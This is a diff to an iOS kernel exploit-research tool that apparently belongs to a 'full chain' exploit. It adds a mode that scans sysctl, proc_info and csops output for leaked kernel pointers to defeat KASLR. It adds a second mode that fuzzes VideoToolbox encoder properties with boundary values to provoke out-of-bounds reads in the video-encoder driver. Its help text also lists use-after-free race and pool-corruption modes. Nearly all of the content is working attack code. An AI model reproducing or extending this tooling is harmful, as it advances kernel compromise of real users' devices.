@@ -49,9 +49,13 @@
 #include <os/log.h>
 #include <sys/xattr.h>
 #include <sys/stat.h>
+#include <sys/sysctl.h>
+#include <libproc.h>
 #include <dirent.h>
 #include <fcntl.h>
 #include <errno.h>
+
+extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 
 #ifndef kIOMasterPortDefault
 #define kIOMasterPortDefault ((mach_port_t)0)
@@ -14221,6 +14225,8 @@ vps_cd_done:
         rlog("  heap_reuse [ntl] [gap] [rounds]  -- Multi-session UAF via NTL corruption\n");
         rlog("  ntl_crash [phase] [frames]       -- KEY: NTL=16464 multi-frame pool crash\n");
         rlog("  mach_race [rounds] [groom] [threads] -- KEY: Mach port IOSurface UAF race\n");
+        rlog("  sysctl_leak [rounds]               -- KEY: sysctl/proc_info kernel pointer probe\n");
+        rlog("  ave_prop_scan [phase]              -- KEY: VT property scan for OOB read triggers\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
@@ -14235,6 +14241,632 @@ vps_cd_done:
         rlog("  466 (~155 enc): Past buffer content (into alloc padding)\n");
         rlog("  1057 (~352 enc): Past allocation end (UNREACHABLE, crash at 197)\n");
     }
+
+    } else if (strcmp(mode, "sysctl_leak") == 0) {
+        int rounds = (argc > 2) ? atoi(argv[2]) : 1;
+        if (rounds < 1) rounds = 1;
+        if (rounds > 100) rounds = 100;
+
+        rlog("=== SYSCTL_LEAK: Probing sysctl/proc_info for kernel pointer leaks ===\n");
+        rlog("rounds=%d\n\n", rounds);
+
+        int candidates = 0;
+
+        /* Phase 1: sysctl probes — MIBs known to have leaked on older iOS */
+        rlog("--- Phase 1: sysctl probes ---\n");
+        const char *sysctl_names[] = {
+            "kern.bootargs", "kern.version", "kern.osversion",
+            "kern.bootsessionuuid", "kern.boottime",
+            "kern.maxvnodes", "kern.maxproc", "kern.maxfiles",
+            "kern.argmax", "kern.hostname", "kern.sysv.shmmax",
+            "kern.usrstack", "kern.usrstack64",
+            "kern.slide", /* direct KASLR slide — blocked on modern iOS */
+            "kern.aslr",
+            "hw.memsize", "hw.physmem", "hw.usermem",
+            "hw.pagesize", "hw.cachelinesize",
+            "hw.l1icachesize", "hw.l1dcachesize", "hw.l2cachesize",
+            "hw.tbfrequency", "hw.cpufrequency", "hw.busfrequency",
+            "hw.machine", "hw.model", "hw.ncpu",
+            "hw.activecpu", "hw.physicalcpu", "hw.logicalcpu",
+            "hw.optional.arm.FEAT_LSE", "hw.optional.arm.FEAT_LSE2",
+            "hw.optional.arm.FEAT_SHA3", "hw.optional.arm.FEAT_BTI",
+            "hw.optional.arm.FEAT_MTE", "hw.optional.arm.FEAT_MTE2",
+            "hw.perflevel0.physicalcpu", "hw.perflevel1.physicalcpu",
+            "hw.perflevel0.cpusperl2", "hw.perflevel0.l2cachesize",
+            "machdep.cpu.address_bits.physical", "machdep.cpu.address_bits.virtual",
+            "machdep.cpu.core_count", "machdep.cpu.thread_count",
+            "net.inet.tcp.pcbcount", "net.inet.udp.pcbcount",
+            "net.inet.tcp.stats", "net.inet.ip.stats",
+            "vm.swapusage", "vm.loadavg",
+            "security.mac.sandbox.sentinel",
+            "debug.iokit", "debug.iotrace",
+            NULL
+        };
+
+        for (int si = 0; sysctl_names[si]; si++) {
+            char buf[4096] = {0};
+            size_t len = sizeof(buf);
+            int rc = sysctlbyname(sysctl_names[si], buf, &len, NULL, 0);
+            if (rc == 0 && len > 0) {
+                rlog("  %-48s len=%4zu ", sysctl_names[si], len);
+                /* Scan returned data for kernel pointer patterns */
+                if (len >= 8) {
+                    for (size_t off = 0; off <= len - 8; off += 4) {
+                        uint64_t val;
+                        memcpy(&val, buf + off, 8);
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            if (val != 0xFFFFFFFFFFFFFFFFULL && val != 0) {
+                                rlog("CANDIDATE @+%zu: 0x%016llx ", off, val);
+                                candidates++;
+                            }
+                        }
+                    }
+                }
+                /* Print first 16 bytes as hex for inspection */
+                rlog("hex=");
+                for (size_t i = 0; i < len && i < 16; i++)
+                    rlog("%02x", (unsigned char)buf[i]);
+                rlog("\n");
+            } else if (rc != 0) {
+                if (errno != ENOENT && errno != EPERM)
+                    rlog("  %-48s FAIL errno=%d (%s)\n", sysctl_names[si], errno, strerror(errno));
+            }
+        }
+
+        /* Phase 1b: Network logging sysctls — CVE-2024-54507 pattern */
+        rlog("\n--- Phase 1b: Network logging sysctls (CVE-2024-54507 pattern) ---\n");
+        const char *net_log_names[] = {
+            "net.inet.udp.log.enabled", "net.inet.udp.log.level",
+            "net.inet.udp.log.remote_port_excluded",
+            "net.inet.udp.log.local_port_included",
+            "net.inet.tcp.log.enabled", "net.inet.tcp.log.level",
+            "net.inet.tcp.log.remote_port_excluded",
+            "net.inet.tcp.log.local_port_included",
+            "net.inet.tcp.log_in_vain", "net.inet.udp.log_in_vain",
+            "net.inet.tcp.rfc1323", "net.inet.tcp.mssdflt",
+            "net.inet.tcp.keepidle", "net.inet.tcp.keepintvl",
+            "net.inet.tcp.sendspace", "net.inet.tcp.recvspace",
+            "net.inet.ip.forwarding", "net.inet.ip.ttl",
+            "net.inet.ip.portrange.first", "net.inet.ip.portrange.last",
+            "net.inet6.ip6.forwarding", "net.inet6.ip6.hlim",
+            "net.inet6.ip6.auto_flowlabel",
+            "net.inet6.icmp6.rediraccept",
+            "net.local.dgram.maxdgram", "net.local.dgram.recvspace",
+            "net.key.debug", "net.key.spi_trycnt",
+            NULL
+        };
+        for (int si = 0; net_log_names[si]; si++) {
+            char buf[4096] = {0};
+            size_t len = sizeof(buf);
+            int rc = sysctlbyname(net_log_names[si], buf, &len, NULL, 0);
+            if (rc == 0 && len > 0) {
+                rlog("  %-48s len=%4zu ", net_log_names[si], len);
+                /* Check for data beyond expected size (OOB read indicator) */
+                if (len >= 8) {
+                    for (size_t off = 0; off <= len - 8; off += 4) {
+                        uint64_t val;
+                        memcpy(&val, buf + off, 8);
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            if (val != 0xFFFFFFFFFFFFFFFFULL && val != 0) {
+                                rlog("CANDIDATE @+%zu: 0x%016llx ", off, val);
+                                candidates++;
+                            }
+                        }
+                    }
+                }
+                /* For small integer sysctls, check if returned length exceeds expected */
+                if (len == 4) {
+                    int32_t ival;
+                    memcpy(&ival, buf, 4);
+                    rlog("val=%d", ival);
+                } else if (len == 8) {
+                    int64_t ival;
+                    memcpy(&ival, buf, 8);
+                    rlog("val=%lld (0x%llx)", ival, ival);
+                } else {
+                    rlog("hex=");
+                    for (size_t i = 0; i < len && i < 16; i++)
+                        rlog("%02x", (unsigned char)buf[i]);
+                }
+                rlog("\n");
+            }
+        }
+
+        /* Phase 1c: sysctl with oversized buffer — check for extra data leak */
+        rlog("\n--- Phase 1c: Oversized buffer read test ---\n");
+        {
+            const char *small_sysctls[] = {
+                "kern.maxproc", "kern.maxfiles", "kern.argmax",
+                "hw.ncpu", "hw.pagesize", "hw.physmem",
+                "net.inet.tcp.pcbcount", "net.inet.udp.pcbcount",
+                NULL
+            };
+            for (int si = 0; small_sysctls[si]; si++) {
+                char buf[256];
+                memset(buf, 0xAA, sizeof(buf)); /* fill with sentinel */
+                size_t len = sizeof(buf);
+                int rc = sysctlbyname(small_sysctls[si], buf, &len, NULL, 0);
+                if (rc == 0) {
+                    /* Check if any bytes beyond len were modified (leak indicator) */
+                    int leaked = 0;
+                    for (size_t off = len; off < sizeof(buf); off++) {
+                        if ((unsigned char)buf[off] != 0xAA) {
+                            leaked++;
+                        }
+                    }
+                    if (leaked > 0) {
+                        rlog("  %-36s len=%zu LEAKED %d bytes beyond!\n",
+                             small_sysctls[si], len, leaked);
+                        rlog("    post-data hex: ");
+                        for (size_t i = len; i < len + 32 && i < sizeof(buf); i++)
+                            rlog("%02x", (unsigned char)buf[i]);
+                        rlog("\n");
+                        candidates++;
+                    }
+                }
+            }
+            rlog("  oversized buffer test complete\n");
+        }
+
+        /* Phase 2: Numeric sysctl MIB walk — kern.*, hw.*, net.*, vm.*, debug.* */
+        rlog("\n--- Phase 2: Numeric MIB walk (kern/hw/vm/debug) ---\n");
+        int mib_tops[] = {1, 6, 2, 4}; /* CTL_KERN, CTL_HW, CTL_NET, CTL_VM -- was CTL_DEBUG=5 */
+        const char *mib_names[] = {"kern", "hw", "net", "vm"};
+        for (int ti = 0; ti < 4; ti++) {
+            int hits = 0;
+            for (int sub = 0; sub < 200; sub++) {
+                int mib[2] = {mib_tops[ti], sub};
+                char buf[4096] = {0};
+                size_t len = sizeof(buf);
+                if (sysctl(mib, 2, buf, &len, NULL, 0) == 0 && len >= 8) {
+                    for (size_t off = 0; off <= len - 8; off += 4) {
+                        uint64_t val;
+                        memcpy(&val, buf + off, 8);
+                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            if (val != 0xFFFFFFFFFFFFFFFFULL && val != 0) {
+                                rlog("  %s.%d @+%zu: 0x%016llx (len=%zu)\n",
+                                     mib_names[ti], sub, off, val, len);
+                                candidates++;
+                                hits++;
+                            }
+                        }
+                    }
+                }
+            }
+            if (!hits) rlog("  %s: 0 kernel pointer candidates in MIB walk\n", mib_names[ti]);
+        }
+
+        /* Phase 3: proc_info flavors */
+        rlog("\n--- Phase 3: proc_info probes ---\n");
+        pid_t mypid = getpid();
+        struct {
+            int flavor;
+            const char *name;
+            size_t bufsize;
+        } proc_flavors[] = {
+            {1, "PROC_PIDLISTFDS", 8192},
+            {2, "PROC_PIDTASKALLINFO", 1024},
+            {3, "PROC_PIDTBSDINFO", 256},
+            {4, "PROC_PIDTASKINFO", 256},
+            {5, "PROC_PIDTHREADINFO", 256},
+            {7, "PROC_PIDVNODEPATHINFO", 2048},
+            {8, "PROC_PIDPATHINFO", 2048},
+            {9, "PROC_PIDWORKQUEUEINFO", 256},
+            {11, "PROC_PIDLISTFILEPORTS", 8192},
+            {12, "PROC_PIDARCHINFO", 64},
+            {13, "PROC_PIDCOALITIONINFO", 256},
+            {14, "PROC_PIDNOTEEXIT", 64},
+            {15, "PROC_PIDREGIONPATHINFO2", 4096},
+            {16, "PROC_PIDREGIONPATHINFO3", 4096},
+            {17, "PROC_PIDEXITREASONINFO", 256},
+            {18, "PROC_PIDEXITREASONBASICINFO", 128},
+            {19, "PROC_PIDLISTUPTRS", 8192},
+            {20, "PROC_PIDLISTDYNKQUEUES", 4096},
+            {0, NULL, 0}
+        };
+
+        for (int fi = 0; proc_flavors[fi].name; fi++) {
+            char *buf = calloc(1, proc_flavors[fi].bufsize);
+            if (!buf) continue;
+            int ret = proc_pidinfo(mypid, proc_flavors[fi].flavor, 0,
+                                   buf, (int)proc_flavors[fi].bufsize);
+            if (ret > 0) {
+                rlog("  %-32s ret=%d ", proc_flavors[fi].name, ret);
+                int found = 0;
+                for (int off = 0; off <= ret - 8; off += 4) {
+                    uint64_t val;
+                    memcpy(&val, buf + off, 8);
+                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                        (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                        if (val != 0xFFFFFFFFFFFFFFFFULL && val != 0) {
+                            rlog("CANDIDATE @+%d: 0x%016llx ", off, val);
+                            candidates++;
+                            found++;
+                        }
+                    }
+                }
+                if (!found) rlog("(clean)");
+                rlog("\n");
+            } else if (ret < 0 && errno != EPERM && errno != ESRCH) {
+                rlog("  %-32s FAIL errno=%d (%s)\n", proc_flavors[fi].name, errno, strerror(errno));
+            }
+            free(buf);
+        }
+
+        /* Phase 4: PROC_PIDLISTUPTRS — user space pointers from kernel, may reveal slide */
+        rlog("\n--- Phase 4: PROC_PIDLISTUPTRS detail ---\n");
+        {
+            uint64_t uptrs[512] = {0};
+            int ret = proc_pidinfo(mypid, 19 /*PROC_PIDLISTUPTRS*/, 0,
+                                   uptrs, (int)sizeof(uptrs));
+            if (ret > 0) {
+                int count = ret / 8;
+                rlog("  Got %d user pointers\n", count);
+                for (int i = 0; i < count && i < 64; i++) {
+                    if (uptrs[i] != 0) {
+                        rlog("    [%2d] 0x%016llx", i, uptrs[i]);
+                        if ((uptrs[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                            (uptrs[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            rlog(" *** KERNEL PTR");
+                            candidates++;
+                        }
+                        rlog("\n");
+                    }
+                }
+            } else {
+                rlog("  PROC_PIDLISTUPTRS: ret=%d errno=%d\n", ret, errno);
+            }
+        }
+
+        /* Phase 5: csops — code signing info, sometimes leaks addresses */
+        rlog("\n--- Phase 5: csops probe ---\n");
+        {
+            uint32_t csflags = 0;
+            if (csops(mypid, 0 /*CS_OPS_STATUS*/, &csflags, sizeof(csflags)) == 0) {
+                rlog("  CS_OPS_STATUS: flags=0x%x\n", csflags);
+            }
+            /* CS_OPS_PIDOFFSET — returns text segment offset */
+            uint64_t pidoffset = 0;
+            if (csops(mypid, 6 /*CS_OPS_PIDOFFSET*/, &pidoffset, sizeof(pidoffset)) == 0) {
+                rlog("  CS_OPS_PIDOFFSET: 0x%016llx\n", pidoffset);
+            }
+            /* CS_OPS_ENTITLEMENTS_BLOB */
+            char entbuf[4096] = {0};
+            if (csops(mypid, 7 /*CS_OPS_ENTITLEMENTS_BLOB*/, entbuf, sizeof(entbuf)) == 0) {
+                rlog("  CS_OPS_ENTITLEMENTS_BLOB: first 32 bytes=");
+                for (int i = 0; i < 32; i++) rlog("%02x", (unsigned char)entbuf[i]);
+                rlog("\n");
+            }
+            /* CS_OPS_IDENTITY — DER identity */
+            char idbuf[4096] = {0};
+            if (csops(mypid, 11 /*CS_OPS_IDENTITY*/, idbuf, sizeof(idbuf)) == 0) {
+                rlog("  CS_OPS_IDENTITY: first 32 bytes=");
+                for (int i = 0; i < 32; i++) rlog("%02x", (unsigned char)idbuf[i]);
+                rlog("\n");
+            }
+        }
+
+        /* Phase 6: Repeated rounds to detect randomization patterns */
+        if (rounds > 1) {
+            rlog("\n--- Phase 6: Stability check (%d rounds) ---\n", rounds);
+            uint64_t prev_boottime[2] = {0};
+            for (int r = 0; r < rounds; r++) {
+                struct timeval bt = {0};
+                size_t btlen = sizeof(bt);
+                sysctlbyname("kern.boottime", &bt, &btlen, NULL, 0);
+                uint64_t bt_val;
+                memcpy(&bt_val, &bt, 8);
+                if (r == 0) { prev_boottime[0] = bt_val; }
+                else if (bt_val != prev_boottime[0]) {
+                    rlog("  round %d: kern.boottime CHANGED: 0x%016llx -> 0x%016llx\n",
+                         r, prev_boottime[0], bt_val);
+                }
+            }
+            rlog("  %d rounds complete, boottime stable\n", rounds);
+        }
+
+        rlog("\n=== SYSCTL_LEAK: %d total candidates ===\n", candidates);
+
+    } else if (strcmp(mode, "ave_prop_scan") == 0) {
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+
+        rlog("=== AVE_PROP_SCAN: VT property scan for OOB read triggers ===\n");
+        rlog("phase=%d (0=all, 1=integer props, 2=data props, 3=comparison)\n\n", phase);
+
+        /*
+         * Strategy: Many VT compression properties map to kernel driver parameters.
+         * Some may be used as array indices for READ operations (not just writes).
+         * We set unusual values and check if the encoded output contains
+         * kernel memory vs. the baseline.
+         *
+         * CVE-2026-112465/112466 (Hcamael): "improved bounds checking" and
+         * "improved input validation" — suggests array index parameters.
+         */
+
+        /* Create baseline encoder */
+        int pw = 192, ph = 128;
+
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: Integer property scan ---\n");
+
+            /* Properties that take integer values and might map to kernel array indices */
+            struct { CFStringRef key; const char *name; int64_t test_vals[6]; int nvals; } int_props[] = {
+                {kVTCompressionPropertyKey_MaxKeyFrameInterval, "MaxKeyFrameInterval",
+                 {0, 1, -1, 0x7FFFFFFF, 256, 65536}, 6},
+                {kVTCompressionPropertyKey_MaxKeyFrameIntervalDuration, "MaxKeyFrameIntervalDuration",
+                 {0, -1, 0x7FFFFFFF, 100000, 0, 0}, 4},
+                {kVTCompressionPropertyKey_AllowTemporalCompression, "AllowTemporalCompression",
+                 {0, 1, -1, 2, 255, 0}, 5},
+                {kVTCompressionPropertyKey_AllowFrameReordering, "AllowFrameReordering",
+                 {0, 1, -1, 2, 255, 0}, 5},
+                {kVTCompressionPropertyKey_AverageBitRate, "AverageBitRate",
+                 {0, 1, -1, 0x7FFFFFFF, 0xFFFFFFFF, 1000000000}, 6},
+                {kVTCompressionPropertyKey_ExpectedFrameRate, "ExpectedFrameRate",
+                 {0, 1, -1, 0x7FFFFFFF, 0, 0}, 4},
+                {kVTCompressionPropertyKey_MaxH264SliceBytes, "MaxH264SliceBytes",
+                 {0, 1, -1, 0x7FFFFFFF, 256, 0}, 5},
+                {kVTCompressionPropertyKey_H264EntropyMode, "H264EntropyMode",
+                 {0, 1, -1, 2, 3, 4}, 6},
+                {kVTCompressionPropertyKey_RealTime, "RealTime",
+                 {0, 1, -1, 2, 0, 0}, 4},
+                {kVTCompressionPropertyKey_MaxFrameDelayCount, "MaxFrameDelayCount",
+                 {0, 1, -1, 0x7FFFFFFF, 256, 0}, 5},
+                {kVTCompressionPropertyKey_ProfileLevel, "ProfileLevel",
+                 {0, 1, -1, 255, 1000, 0}, 5},
+                {kVTCompressionPropertyKey_Quality, "Quality",
+                 {0, -1, 2, 100, 0, 0}, 4},
+            };
+
+            int nprops = sizeof(int_props) / sizeof(int_props[0]);
+            for (int pi = 0; pi < nprops; pi++) {
+                rlog("  Testing: %s\n", int_props[pi].name);
+
+                /* Get baseline with default value */
+                VTCompressionSessionRef base_session = NULL;
+                OSStatus st = VTCompressionSessionCreate(NULL, pw, ph,
+                    kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &base_session);
+                if (st != 0 || !base_session) {
+                    rlog("    baseline create failed: %d\n", (int)st);
+                    continue;
+                }
+                VTSessionSetProperty(base_session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                VTCompressionSessionPrepareToEncodeFrames(base_session);
+
+                /* Encode one baseline frame */
+                CVPixelBufferRef base_px = NULL;
+                CVPixelBufferCreate(NULL, pw, ph, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                                    NULL, &base_px);
+                if (base_px) {
+                    CVPixelBufferLockBaseAddress(base_px, 0);
+                    size_t yh = CVPixelBufferGetHeightOfPlane(base_px, 0);
+                    size_t ybpr = CVPixelBufferGetBytesPerRowOfPlane(base_px, 0);
+                    void *ybase = CVPixelBufferGetBaseAddressOfPlane(base_px, 0);
+                    if (ybase) memset(ybase, 0x80, yh * ybpr);
+                    size_t uvh = CVPixelBufferGetHeightOfPlane(base_px, 1);
+                    size_t uvbpr = CVPixelBufferGetBytesPerRowOfPlane(base_px, 1);
+                    void *uvbase = CVPixelBufferGetBaseAddressOfPlane(base_px, 1);
+                    if (uvbase) memset(uvbase, 0x80, uvh * uvbpr);
+                    CVPixelBufferUnlockBaseAddress(base_px, 0);
+                }
+
+                /* Capture baseline output */
+                __block uint8_t base_nal[2048];
+                __block size_t base_nal_len = 0;
+                __block int base_got = 0;
+                CMTime pts0 = CMTimeMake(0, 600);
+                VTCompressionSessionEncodeFrameWithOutputHandler(base_session, base_px,
+                    pts0, kCMTimeInvalid, NULL,
+                    ^(OSStatus s2, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+                        if (s2 == 0 && sb) {
+                            CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
+                            if (bb) {
+                                size_t tlen = CMBlockBufferGetDataLength(bb);
+                                if (tlen > sizeof(base_nal)) tlen = sizeof(base_nal);
+                                CMBlockBufferCopyDataBytes(bb, 0, tlen, base_nal);
+                                base_nal_len = tlen;
+                                base_got = 1;
+                            }
+                        }
+                    });
+                VTCompressionSessionCompleteFrames(base_session, kCMTimeInvalid);
+                VTCompressionSessionInvalidate(base_session);
+                CFRelease(base_session);
+
+                if (!base_got || base_nal_len == 0) {
+                    rlog("    no baseline output\n");
+                    if (base_px) CVPixelBufferRelease(base_px);
+                    continue;
+                }
+
+                /* Test each unusual value */
+                for (int vi = 0; vi < int_props[pi].nvals; vi++) {
+                    int64_t val = int_props[pi].test_vals[vi];
+                    VTCompressionSessionRef test_session = NULL;
+                    st = VTCompressionSessionCreate(NULL, pw, ph,
+                        kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &test_session);
+                    if (st != 0 || !test_session) continue;
+
+                    CFNumberRef nval = CFNumberCreate(NULL, kCFNumberSInt64Type, &val);
+                    OSStatus pst = VTSessionSetProperty(test_session, int_props[pi].key, nval);
+                    CFRelease(nval);
+
+                    VTSessionSetProperty(test_session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                    VTCompressionSessionPrepareToEncodeFrames(test_session);
+
+                    __block uint8_t test_nal[2048];
+                    __block size_t test_nal_len = 0;
+                    __block int test_got = 0;
+                    VTCompressionSessionEncodeFrameWithOutputHandler(test_session, base_px,
+                        pts0, kCMTimeInvalid, NULL,
+                        ^(OSStatus s2, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+                            if (s2 == 0 && sb) {
+                                CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
+                                if (bb) {
+                                    size_t tlen = CMBlockBufferGetDataLength(bb);
+                                    if (tlen > sizeof(test_nal)) tlen = sizeof(test_nal);
+                                    CMBlockBufferCopyDataBytes(bb, 0, tlen, test_nal);
+                                    test_nal_len = tlen;
+                                    test_got = 1;
+                                }
+                            }
+                        });
+                    VTCompressionSessionCompleteFrames(test_session, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(test_session);
+                    CFRelease(test_session);
+
+                    if (test_got && test_nal_len > 0) {
+                        /* Compare with baseline */
+                        int diffs = 0;
+                        size_t cmplen = base_nal_len < test_nal_len ? base_nal_len : test_nal_len;
+                        for (size_t ci = 0; ci < cmplen; ci++) {
+                            if (base_nal[ci] != test_nal[ci]) diffs++;
+                        }
+                        int size_diff = (int)test_nal_len - (int)base_nal_len;
+
+                        if (diffs > 0 || size_diff != 0) {
+                            rlog("    val=%lld: pst=%d, len=%zu (delta=%+d), diffs=%d",
+                                 val, (int)pst, test_nal_len, size_diff, diffs);
+
+                            /* Scan test output for kernel pointer patterns */
+                            int kptrs = 0;
+                            for (size_t off = 0; off <= test_nal_len - 8; off += 1) {
+                                uint64_t v;
+                                memcpy(&v, test_nal + off, 8);
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                    (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                    if (v != 0xFFFFFFFFFFFFFFFFULL && v != 0) {
+                                        rlog(" KPTR@%zu=0x%016llx", off, v);
+                                        kptrs++;
+                                    }
+                                }
+                            }
+                            if (kptrs > 0) rlog(" *** %d KERNEL POINTER CANDIDATES", kptrs);
+                            rlog("\n");
+                        }
+                    }
+                }
+                if (base_px) CVPixelBufferRelease(base_px);
+            }
+        }
+
+        if (phase == 0 || phase == 2) {
+            rlog("\n--- Phase 2: DataRateLimit array scan ---\n");
+            /* DataRateLimits takes an array of number pairs [bytes, seconds]
+             * Large values may cause the kernel to read from OOB locations */
+            int test_vals[][2] = {
+                {0, 0}, {-1, 1}, {0x7FFFFFFF, 1}, {1, -1}, {1, 0x7FFFFFFF},
+                {0xFFFFFFFF, 1}, {1, 0xFFFFFFFF}, {256, 0}, {0, 256}
+            };
+            int ntests = sizeof(test_vals) / sizeof(test_vals[0]);
+
+            for (int ti = 0; ti < ntests; ti++) {
+                VTCompressionSessionRef s = NULL;
+                OSStatus st = VTCompressionSessionCreate(NULL, pw, ph,
+                    kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s);
+                if (st != 0 || !s) continue;
+
+                /* Build DataRateLimits array: [bytes_per_sec, duration_sec] */
+                int v0 = test_vals[ti][0], v1 = test_vals[ti][1];
+                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
+                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
+                CFNumberRef nums[] = {n0, n1};
+                CFArrayRef arr = CFArrayCreate(NULL, (const void**)nums, 2, &kCFTypeArrayCallBacks);
+                OSStatus pst = VTSessionSetProperty(s,
+                    kVTCompressionPropertyKey_DataRateLimits, arr);
+                CFRelease(arr); CFRelease(n0); CFRelease(n1);
+
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                VTCompressionSessionPrepareToEncodeFrames(s);
+
+                CVPixelBufferRef px = NULL;
+                CVPixelBufferCreate(NULL, pw, ph,
+                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &px);
+                if (px) {
+                    CVPixelBufferLockBaseAddress(px, 0);
+                    void *yb = CVPixelBufferGetBaseAddressOfPlane(px, 0);
+                    if (yb) memset(yb, 0x80,
+                        CVPixelBufferGetHeightOfPlane(px, 0) * CVPixelBufferGetBytesPerRowOfPlane(px, 0));
+                    void *uvb = CVPixelBufferGetBaseAddressOfPlane(px, 1);
+                    if (uvb) memset(uvb, 0x80,
+                        CVPixelBufferGetHeightOfPlane(px, 1) * CVPixelBufferGetBytesPerRowOfPlane(px, 1));
+                    CVPixelBufferUnlockBaseAddress(px, 0);
+                }
+
+                __block size_t out_len = 0;
+                __block int got = 0;
+                __block int kptrs = 0;
+                CMTime pts = CMTimeMake(0, 600);
+                VTCompressionSessionEncodeFrameWithOutputHandler(s, px,
+                    pts, kCMTimeInvalid, NULL,
+                    ^(OSStatus s2, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+                        if (s2 == 0 && sb) {
+                            CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
+                            if (bb) {
+                                out_len = CMBlockBufferGetDataLength(bb);
+                                got = 1;
+                                /* Scan for kernel pointers */
+                                uint8_t buf[2048];
+                                size_t slen = out_len > sizeof(buf) ? sizeof(buf) : out_len;
+                                CMBlockBufferCopyDataBytes(bb, 0, slen, buf);
+                                for (size_t off = 0; off + 8 <= slen; off++) {
+                                    uint64_t v;
+                                    memcpy(&v, buf + off, 8);
+                                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                        (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                        if (v != 0xFFFFFFFFFFFFFFFFULL && v != 0)
+                                            kptrs++;
+                                    }
+                                }
+                            }
+                        }
+                    });
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+
+                rlog("  [%d,%d]: pst=%d got=%d len=%zu kptrs=%d\n",
+                     v0, v1, (int)pst, got, out_len, kptrs);
+
+                if (px) CVPixelBufferRelease(px);
+            }
+        }
+
+        if (phase == 0 || phase == 3) {
+            rlog("\n--- Phase 3: Codec-specific property enum + boundary test ---\n");
+            /* Test HEVC-specific properties with boundary values */
+            struct { const char *name; CFStringRef key; } hevc_props[] = {
+                {"kVTCompressionPropertyKey_HDRMetadataInsertionMode", kVTCompressionPropertyKey_HDRMetadataInsertionMode},
+                {"kVTCompressionPropertyKey_PrioritizeEncodingSpeedOverQuality", kVTCompressionPropertyKey_PrioritizeEncodingSpeedOverQuality},
+                {"kVTCompressionPropertyKey_ConstantBitRate", kVTCompressionPropertyKey_ConstantBitRate},
+                {"kVTCompressionPropertyKey_PreserveDynamicHDRMetadata", kVTCompressionPropertyKey_PreserveDynamicHDRMetadata},
+                {"kVTCompressionPropertyKey_MaxAllowedFrameQP", kVTCompressionPropertyKey_MaxAllowedFrameQP},
+            };
+            int nhevc = sizeof(hevc_props) / sizeof(hevc_props[0]);
+
+            for (int hi = 0; hi < nhevc; hi++) {
+                rlog("  %s:\n", hevc_props[hi].name);
+                int64_t vals[] = {0, 1, -1, 2, 255, 256, 0x7FFFFFFF, 0xFFFFFFFF};
+                for (int vi = 0; vi < 8; vi++) {
+                    VTCompressionSessionRef s = NULL;
+                    OSStatus st = VTCompressionSessionCreate(NULL, pw, ph,
+                        kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s);
+                    if (st != 0 || !s) continue;
+
+                    CFNumberRef nv = CFNumberCreate(NULL, kCFNumberSInt64Type, &vals[vi]);
+                    OSStatus pst = VTSessionSetProperty(s, hevc_props[hi].key, nv);
+                    CFRelease(nv);
+                    rlog("    val=%lld: pst=%d\n", vals[vi], (int)pst);
+
+                    VTCompressionSessionInvalidate(s);
+                    CFRelease(s);
+                }
+            }
+        }
+
+        rlog("\n=== AVE_PROP_SCAN complete ===\n");
 
 done:
     rlog("\n=== Full chain probe complete ===\n");
